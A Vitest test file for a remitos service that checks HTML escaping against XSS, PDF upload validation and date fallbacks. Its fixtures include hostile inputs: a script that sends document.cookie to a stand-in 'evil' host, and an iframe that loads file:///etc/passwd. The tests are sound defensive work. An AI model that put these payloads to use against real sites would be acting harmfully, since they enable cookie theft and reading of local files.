/**
 * SECCION 7: PDF remito (XSS/SSRF + uploadSignedPdf)
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { mockPoolQuery, mockDbExecute, resetMocks } from './helpers/setup';

vi.mock('../src/config/logger', () => ({
  default: { info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn() },
}));

async function makeService() {
  const { RemitosService } = await import('../src/modules/remitos/remitos.service');
  const service = new (RemitosService as any)();
  service.tablesEnsured = true;
  return service;
}

// ═══════════════════════════════════════════════════════════════════
// BUG #1: XSS / HTML injection escape
// ═══════════════════════════════════════════════════════════════════

describe('Seccion 7 BUG #1: escapeHtml previene XSS en buildRemitoHtml', () => {
  beforeEach(() => resetMocks());

  it('escapeHtml escapa < > & " \'', async () => {
    const service = await makeService();
    const result = (service as any).escapeHtml('<script>alert("x")</script>');
    expect(result).not.toContain('<script>');
    expect(result).toContain('&lt;script&gt;');
    expect(result).toContain('&quot;');
  });

  it('escapeHtml maneja null/undefined', async () => {
    const service = await makeService();
    expect((service as any).escapeHtml(null)).toBe('');
    expect((service as any).escapeHtml(undefined)).toBe('');
  });

  it('buildRemitoHtml escapa product_name con HTML injection', async () => {
    const service = await makeService();
    const remito = {
      items: [{ product_name: '<img src="http://evil/">', quantity: 1 }],
      enterprise: { name: 'Test' },
      customer: {},
      remito_number: 1,
      date: new Date().toISOString(),
    };
    const html = (service as any).buildRemitoHtml({}, remito);
    expect(html).not.toContain('<img src="http://evil/">');
    expect(html).toContain('&lt;img');
  });

  it('buildRemitoHtml escapa receiver/enterprise con script tag', async () => {
    const service = await makeService();
    const remito = {
      items: [],
      enterprise: { name: '<script>fetch("http://evil/"+document.cookie)</script>' },
      customer: {},
      remito_number: 1,
      date: new Date().toISOString(),
    };
    const html = (service as any).buildRemitoHtml({}, remito);
    expect(html).not.toContain('<script>fetch');
    expect(html).toContain('&lt;script&gt;');
  });

  it('buildRemitoHtml escapa factura_ref injection', async () => {
    const service = await makeService();
    const remito = {
      items: [],
      enterprise: {},
      customer: {},
      remito_number: 1,
      date: new Date().toISOString(),
      factura_ref: '<iframe src="file:///etc/passwd">',
    };
    const html = (service as any).buildRemitoHtml({}, remito);
    expect(html).not.toContain('<iframe src="file:');
    expect(html).toContain('&lt;iframe');
  });
});

// ═══════════════════════════════════════════════════════════════════
// BUG #6: Fecha invalida
// ═══════════════════════════════════════════════════════════════════

describe('Seccion 7 BUG #6: fecha invalida fallback', () => {
  beforeEach(() => resetMocks());

  it('no muestra "Invalid Date" si date es null', async () => {
    const service = await makeService();
    const html = (service as any).buildRemitoHtml({}, {
      items: [], enterprise: {}, customer: {}, remito_number: 1, date: null, created_at: null,
    });
    expect(html).not.toContain('Invalid Date');
  });

  it('no muestra "Invalid Date" si date es string garbage', async () => {
    const service = await makeService();
    const html = (service as any).buildRemitoHtml({}, {
      items: [], enterprise: {}, customer: {}, remito_number: 1, date: 'garbage-string', created_at: 'also-bad',
    });
    expect(html).not.toContain('Invalid Date');
  });
});

// ═══════════════════════════════════════════════════════════════════
// BUG #4: uploadSignedPdf magic bytes defense-in-depth
// ═══════════════════════════════════════════════════════════════════

describe('Seccion 7 BUG #4: uploadSignedPdf valida magic bytes', () => {
  beforeEach(() => resetMocks());

  it('rechaza base64 que no es PDF', async () => {
    const notPdfBase64 = Buffer.from('this is not a pdf').toString('base64');
    mockDbExecute.mockImplementation(async () => ({ rows: [{ id: 'r1', status: 'pendiente' }] }));
    const service = await makeService();
    await expect(service.uploadSignedPdf('comp-1', 'r1', notPdfBase64))
      .rejects.toThrow(/magic bytes|PDF valido/);
  });

  it('rechaza base64 vacio', async () => {
    const service = await makeService();
    await expect(service.uploadSignedPdf('comp-1', 'r1', ''))
      .rejects.toThrow(/vacio/);
  });

  it('rechaza PDF > 5MB', async () => {
    const bigBuffer = Buffer.concat([Buffer.from('%PDF-'), Buffer.alloc(6 * 1024 * 1024)]);
    const service = await makeService();
    await expect(service.uploadSignedPdf('comp-1', 'r1', bigBuffer.toString('base64')))
      .rejects.toThrow(/5MB/);
  });

  it('acepta PDF valido con magic bytes', async () => {
    const validPdf = Buffer.concat([Buffer.from('%PDF-1.4\n'), Buffer.from('fake content')]).toString('base64');
    let updateCalled = false;
    mockDbExecute.mockImplementation(async (query: any) => {
      const s = String(query);
      if (s.includes('UPDATE') || (query.queryChunks && JSON.stringify(query.queryChunks).includes('UPDATE'))) {
        updateCalled = true;
      }
      return { rows: [{ id: 'r1', status: 'pendiente' }] };
    });
    const service = await makeService();
    const result = await service.uploadSignedPdf('comp-1', 'r1', validPdf);
    expect(result.uploaded).toBe(true);
  });
});

// ═══════════════════════════════════════════════════════════════════
// BUG #10: uploadSignedPdf rechaza remito anulado
// ═══════════════════════════════════════════════════════════════════

describe('Seccion 7 BUG #10: uploadSignedPdf rechaza anulado', () => {
  beforeEach(() => resetMocks());

  it('rechaza upload a remito anulado', async () => {
    const validPdf = Buffer.from('%PDF-1.4\ntest').toString('base64');
    mockDbExecute.mockImplementation(async () => ({ rows: [{ id: 'r1', status: 'anulado' }] }));
    const service = await makeService();
    await expect(service.uploadSignedPdf('comp-1', 'r1', validPdf))
      .rejects.toThrow(/anulado/);
  });
});
